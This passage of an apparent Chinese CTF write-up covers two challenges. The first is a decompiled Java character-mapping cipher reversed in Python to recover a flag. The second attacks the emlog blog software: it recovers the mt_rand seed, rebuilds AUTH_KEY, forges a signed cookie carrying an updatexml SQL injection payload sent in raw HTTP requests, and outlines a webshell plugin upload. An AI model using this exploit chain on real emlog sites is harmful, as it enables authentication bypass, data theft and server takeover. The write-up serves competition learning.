        hashMap.put('a', "iiijj");
        this.fish_ecode.put('b', "jjjii");
        this.fish_ecode.put('c', "jijij");
        this.fish_ecode.put('d', "jjijj");
        this.fish_ecode.put('e', "jjjjj");
        this.fish_ecode.put('f', "ijjjj");
        this.fish_ecode.put('g', "jjjji");
        this.fish_ecode.put('h', "iijii");
        this.fish_ecode.put('i', "ijiji");
        this.fish_ecode.put('j', "iiiji");
        this.fish_ecode.put('k', "jjjij");
        this.fish_ecode.put('l', "jijji");
        this.fish_ecode.put('m', "ijiij");
        this.fish_ecode.put('n', "iijji");
        this.fish_ecode.put('o', "ijjij");
        this.fish_ecode.put('p', "jiiji");
        this.fish_ecode.put('q', "ijijj");
        this.fish_ecode.put('r', "jijii");
        this.fish_ecode.put('s', "iiiii");
        this.fish_ecode.put('t', "jjiij");
        this.fish_ecode.put('u', "ijjji");
        this.fish_ecode.put('v', "jiiij");
        this.fish_ecode.put('w', "iiiij");
        this.fish_ecode.put('x', "iijij");
        this.fish_ecode.put('y', "jjiji");
        this.fish_ecode.put('z', "jijjj");
        this.fish_ecode.put('1', "iijjl");
        this.fish_ecode.put('2', "iiilj");
        this.fish_ecode.put('3', "iliii");
        this.fish_ecode.put('4', "jiili");
        this.fish_ecode.put('5', "jilji");
        this.fish_ecode.put('6', "iliji");
        this.fish_ecode.put('7', "jjjlj");
        this.fish_ecode.put('8', "ijljj");
        this.fish_ecode.put('9', "iljji");
        this.fish_ecode.put('0', "jjjli");
    }

    public void decode_map() {
        HashMap<String, Character> hashMap = new HashMap<>();
        this.fish_dcode = hashMap;
        hashMap.put("iiijj", 'a');
        this.fish_dcode.put("jjjii", 'b');
        this.fish_dcode.put("jijij", 'c');
        this.fish_dcode.put("jjijj", 'd');
        this.fish_dcode.put("jjjjj", 'e');
        this.fish_dcode.put("ijjjj", 'f');
        this.fish_dcode.put("jjjji", 'g');
        this.fish_dcode.put("iijii", 'h');
        this.fish_dcode.put("ijiji", 'i');
        this.fish_dcode.put("iiiji", 'j');
        this.fish_dcode.put("jjjij", 'k');
        this.fish_dcode.put("jijji", 'l');
        this.fish_dcode.put("ijiij", 'm');
        this.fish_dcode.put("iijji", 'n');
        this.fish_dcode.put("ijjij", 'o');
        this.fish_dcode.put("jiiji", 'p');
        this.fish_dcode.put("ijijj", 'q');
        this.fish_dcode.put("jijii", 'r');
        this.fish_dcode.put("iiiii", 's');
        this.fish_dcode.put("jjiij", 't');
        this.fish_dcode.put("ijjji", 'u');
        this.fish_dcode.put("jiiij", 'v');
        this.fish_dcode.put("iiiij", 'w');
        this.fish_dcode.put("iijij", 'x');
        this.fish_dcode.put("jjiji", 'y');
        this.fish_dcode.put("jijjj", 'z');
        this.fish_dcode.put("iijjl", '1');
        this.fish_dcode.put("iiilj", '2');
        this.fish_dcode.put("iliii", '3');
        this.fish_dcode.put("jiili", '4');
        this.fish_dcode.put("jilji", '5');
        this.fish_dcode.put("iliji", '6');
        this.fish_dcode.put("jjjlj", '7');
        this.fish_dcode.put("ijljj", '8');
        this.fish_dcode.put("iljji", '9');
        this.fish_dcode.put("jjjli", '0');
    }

    public String encode(String str) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < str.length(); i++) {
            sb.append(this.fish_ecode.get(Character.valueOf(str.charAt(i))));
        }
        return sb.toString();
    }

    public String decode(String str) {
        StringBuilder sb = new StringBuilder();
        int i = 0;
        int i2 = 0;
        while (i2 < str.length() / 5) {
            int i3 = i + 5;
            sb.append(this.fish_dcode.get(str.substring(i, i3)));
            i2++;
            i = i3;
        }
        return sb.toString();
    }

    public boolean check(String str) {
        if (str.equals(this.strr)) {
            return true;
        }
        return false;
    }
}
```

这里面就很容易看出解密逻辑，先写个脚本

```python
# 解密映射表 (fish_dcode)，参考你提供的 `hook_fish` 中的 `fish_dcode`
fish_dcode = {
    "iiijj": 'a', "jjjii": 'b', "jijij": 'c', "jjijj": 'd', "jjjjj": 'e',
    "ijjjj": 'f', "jjjji": 'g', "iijii": 'h', "ijiji": 'i', "iiiji": 'j',
    "jjjij": 'k', "jijji": 'l', "ijiij": 'm', "iijji": 'n', "ijjij": 'o',
    "jiiji": 'p', "ijijj": 'q', "jijii": 'r', "iiiii": 's', "jjiij": 't',
    "ijjji": 'u', "jiiij": 'v', "iiiij": 'w', "iijij": 'x', "jjiji": 'y',
    "jijjj": 'z', "iijjl": '1', "iiilj": '2', "iliii": '3', "jiili": '4',
    "jilji": '5', "iliji": '6', "jjjlj": '7', "ijljj": '8', "iljji": '9',
    "jjjli": '0'
}


def decode(encoded_str):
    decoded_str = ""
    # 每 5 个字符为一组进行解密
    for i in range(0, len(encoded_str), 5):
        encoded_char = encoded_str[i:i + 5]
        if encoded_char in fish_dcode:
            decoded_str += fish_dcode[encoded_char]
        else:
            decoded_str += '?'  # 如果遇到未知字符，则使用 '?' 表示
    return decoded_str


# 模拟解密加密后的字符串
def main():
    # 假设这是加密过的字符串
    encrypted_str = "jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji"

    print("解密后的字符串: ", decode(encrypted_str))


if __name__ == "__main__":
    main()
# 解密后的字符串:  0qksrtuw0x74r2n3s2x3ooi4ps54r173k2os12r32pmqnu73r1h432n301twnq43prruo2h5
```

但是如何把这个东西变成flag呢，就是根据上面的解密算法，反着给写出来就好了

最终exp如下

```python
s = "jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji"
ij_dict = {"iiijj": "a",
           "jjjii": 'b',
           "jijij": 'c',
           "jjijj": 'd',
           "jjjjj": 'e',
           "ijjjj": 'f',
           "jjjji": 'g',
           "iijii": 'h',
           "ijiji": 'i',
           "iiiji": 'j',
           "jjjij": 'k',
           "jijji": 'l',
           "ijiij": 'm',
           "iijji": 'n',
           "ijjij": 'o',
           "jiiji": 'p',
           "ijijj": 'q',
           "jijii": 'r',
           "iiiii": 's',
           "jjiij": 't',
           "ijjji": 'u',
           "jiiij": 'v',
           "iiiij": 'w',
           "iijij": 'x',
           "jjiji": 'y',
           "jijjj": 'z',
           "iijjl": '1',
           "iiilj": '2',
           "iliii": '3',
           "jiili": '4',
           "jilji": '5',
           "iliji": '6',
           "jjjlj": '7',
           "ijljj": '8',
           "iljji": '9',
           "jjjli": '0'}

def process_string(s, ij_dict):
    c = ""
    for i in range(0, len(s), 5):
        c += ij_dict[s[i:i + 5]]
    # print(c)

    c = list(c.encode('utf-8'))
    for i in range(len(c)):
        if c[i] > 55:
            c[i] -= (i % 10 + 55)
        else:
            c[i] += (49 - i % 4)

    for i in range(0, len(c), 2):
        c[i], c[i + 1] = c[i + 1], c[i]
    d = bytes.fromhex(bytes(c).decode())
    for i in range(len(d)):
        print(chr(d[i] - 68), end="")


if __name__ == "__main__":
    process_string(s, ij_dict)

```

# remake

## **ez_emlog**

看到猴子大王搭建博客的时间是最近，直接写个最新版本的代码来进行审计，且在网上进行信息搜集，发现网上特别多文件上传getshell，但是要进行文件上传就必须进入后台，所以我们可以搜索emlog越权，找到部分文章

[文章1](https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Emlog/Emlog%20%E8%B6%8A%E6%9D%83%26%E5%90%8E%E5%8F%B0getshell/) [文章2](https://blog.csdn.net/qq_36759934/article/details/127821085)

看完之后就是`install.php`的洞，接着没看多久，题目就给提示了，

> install.php
>
> mt_rand的安全问题

也就是和文章中的类似，我们只需要找到关键代码即可，但是此刻我还没做完奶龙，于是便调整战斗方向，现在来浮现一下

![1](QQ20250211-104414.jpg)

看到了php版本，而伪随机数的问题又是只有两个版本，所以这里锁定结果为php7

![1](QQ20250211-104344.jpg)

看到了两个key的生成逻辑，到这里`install.php`就没啥用了，跟进`getRandStr()`，进行运行生成随机数发现是伪随机数

```php
<?php
function getRandStr($length = 12, $special_chars = true, $numeric_only = false)
{
    if ($numeric_only) {
        $chars = '0123456789';
    } else {
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        if ($special_chars) {
            $chars .= '!@#$%^&*()';
        }
    }
    $randStr = '';
    $chars_length = strlen($chars);
    for ($i = 0; $i < $length; $i++) {
        $randStr .= substr($chars, mt_rand(0, $chars_length - 1), 1);
    }
    return $randStr;
}
echo getRandStr(32);
```

找不到东西了，全局搜索`AUTH_KEY`，来到`loginauth.php`，这里就是鉴权逻辑了，其中拿出关键部分

![1](QQ20250211-105348.jpg)

直接对sql语句进行拼接，可以进行sql注入，回头看这个函数啥时候调用的，就在他上面，

![1](QQ20250211-105512.jpg)

还有就是cookie的处理

```php
public static function validateAuthCookie($cookie = '')
    {
        if (empty($cookie)) {
            return false;
        }

        $cookie_elements = explode('|', $cookie);
        if (count($cookie_elements) !== 3) {
            return false;
        }

        list($username, $expiration, $hmac) = $cookie_elements;

        if (!empty($expiration) && $expiration < time()) {
            return false;
        }

        $key = self::emHash($username . '|' . $expiration);
        $hash = hash_hmac('md5', $username . '|' . $expiration, $key);

        if ($hmac !== $hash) {
            return false;
        }

        $user = self::getUserDataByLogin($username);
        if (!$user) {
            return false;
        }
        return $user;
    }
```

当然我们的目的也别忘了，寻找`AUTH_KEY`

```php
private static function emHash($data)
    {
        return hash_hmac('md5', $data, AUTH_KEY);
    }
```

写个代码运行一下，发现是根据`AUTH_KEY`产生的不变值，是可控的，暂时找不到东西了，回头再去看发现原来`AUTH_COOKIE_NAME`也是利用的`getRandStr`产生的随机数，会全局搜索到`setAuthCookie`，看看哪里调用了这个函数，跟进到`account.php`，在最后看到了

```php
if ($action == 'logout') {
    setcookie(AUTH_COOKIE_NAME, ' ', time() - 31536000, '/');
    emDirect("../");
}
```

这不是就能获得其中一个随机数了，然后爆破种子了吗 [php_mt_seed](https://github.com/openwall/php_mt_seed)

```
make
./php_mt_seed 1165510977
```

如果成功了就是安装好了，那我们开始爆破，首先获得随机数

```python
import requests

url = "http://node.vnteam.cn:47975/admin/account.php?action=logout"
r = requests.get(url, allow_redirects=False)
# print(r.text)
print(r.headers.get("Set-Cookie"))
# EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=%20; expires=Mon, 12 Feb 2024 03:21:20 GMT; Max-Age=0; path=/
```

参考我以前的文章将字符串进行分解 

```python
dict1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
dict2 = 'RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr='
response = ""
for i in range(len(dict2)):
    for j in range(len(dict1)):
        if dict2[i] == dict1[j]:
            response += str(j) + ' ' + str(j) + ' ' + '0' + ' ' + str(len(dict1) - 1) + ' '
            break

print(response)
# 43 43 0 61 1 1 0 61 26 26 0 61 48 48 0 61 21 21 0 61 39 39 0 61 35 35 0 61 51 51 0 61 57 57 0 61 50 50 0 61 38 38 0 61 4 4 0 61 51 51 0 61 37 37 0 61 32 32 0 61 38 38 0 61 17 17 0 61 57 57 0 61 58 58 0 61 11 11 0 61 5 5 0 61 9 9 0 61 47 47 0 61 0 0 0 61 11 11 0 61 40 40 0 61 55 55 0 61 24 24 0 61 16 16 0 61 50 50 0 61 11 11 0 61 17 17 0 61 
```

由于前面我们知道还拼接了`getRandStr(32)`，所以我们还要补32组0

```
./php_mt_seed 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 43 43 0 61 1 1 0 61 26 26 0 61 48 48 0 61 21 21 0 61 39 39 0 61 35 35 0 61 51 51 0 61 57 57 0 61 50 50 0 61 38 38 0 61 4 4 0 61 51 51 0 61 37 37 0 61 32 32 0 61 38 38 0 61 17 17 0 61 57 57 0 61 58 58 0 61 11 11 0 61 5 5 0 61 9 9 0 61 47 47 0 61 0 0 0 61 11 11 0 61 40 40 0 61 55 55 0 61 24 24 0 61 16 16 0 61 50 50 0 61 11 11 0 61 17 17 0 61 
```

得到种子之后就可以拿了

```php
<?php
function getRandStr($length = 12, $special_chars = true, $numeric_only = false)
{
    if ($numeric_only) {
        $chars = '0123456789';
    } else {
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        if ($special_chars) {
            $chars .= '!@#$%^&*()';
        }
    }
    $randStr = '';
    $chars_length = strlen($chars);
    for ($i = 0; $i < $length; $i++) {
        $randStr .= substr($chars, mt_rand(0, $chars_length - 1), 1);
    }
    return $randStr;
}
$seed = 2430606281;
mt_srand($seed);

echo getRandStr(32);
// yxuzKkM2QC8L8WLPFvawb(mI4R&NglOA
```

```php
"const AUTH_KEY = '" . getRandStr(32) . md5(getUA()) . "';"
```

UA头在文章里面，文章给的数据包还有有道理的

```php
<?php
//$UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36"
//const AUTH_KEY = '" . yxuzKkM2QC8L8WLPFvawb(mI4R&NglOA . md5($UA) . "';
//echo AUTH_KEY;


$UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36";
$auth_key = 'yxuzKkM2QC8L8WLPFvawb(mI4R&NglOA'.md5($UA);
echo $auth_key;
// yxuzKkM2QC8L8WLPFvawb(mI4R&NglOA558fb80a37ff0f45d5abbc907683fc02
```

```php
<?php

function emHash($data)
{
    $key="yxuzKkM2QC8L8WLPFvawb(mI4R&NglOA558fb80a37ff0f45d5abbc907683fc02";
    return hash_hmac('md5', $data, $key);
}
$expiration = 0;
$username="' and updatexml(1,concat(0x7e,(select(substr(username,1,16))from(emlog_user)),0x7e),1)#";
$auth_key = emHash($username . '|' . $expiration);
$hash=hash_hmac('md5',$username.'|'.$expiration,$auth_key);
$cookie=$username.'|'.$expiration.'|'.$hash;
echo $cookie;
// ' and updatexml(1,concat(0x7e,(select(substr(username,1,16))from(emlog_user)),0x7e),1)#|0|36d259d7087ad3871811f309eebb0ddf
```

python发包发不了了一直是502，只能发数据包

```http
GET /admin/index.php HTTP/1.1
Host: node.vnteam.cn:46959
Cookie: EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=' and updatexml(1,concat(0x7e,(select(substr(username,1,16))from(emlog_user)),0x7e),1)#|0|36d259d7087ad3871811f309eebb0ddf


```

注意格式别错了

```http
GET /admin/index.php HTTP/1.1
Host: node.vnteam.cn:46959
Cookie: EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=' and updatexml(1,concat(0x7e,(select(substr(username,17,32))from(emlog_user)),0x7e),1)#|0|d14367cc322f7d8818b7b6284c7c64ae


```

得到用户名`1QXgVCpRbGseY_UA6DPDV1K8XOCZHUxm`

![1](QQ20250211-123657.jpg)

我们可以直接上传插件，压缩包里面放webshell即可，看了刚才的那两个文章的也知道压缩包怎么制作了，就不写了

![1](QQ20250211-124927.jpg)

得到文件路径，并且跟进`emUnZip`

![1](QQ20250211-125246.jpg)

> 综上这里就是检测压缩包中文件夹里面是否存在一个与文件夹名称一致的PHP文件，最后再解压

![1](QQ20250211-125332.jpg)

本来还想要浮现aimind，但是环境好像关了
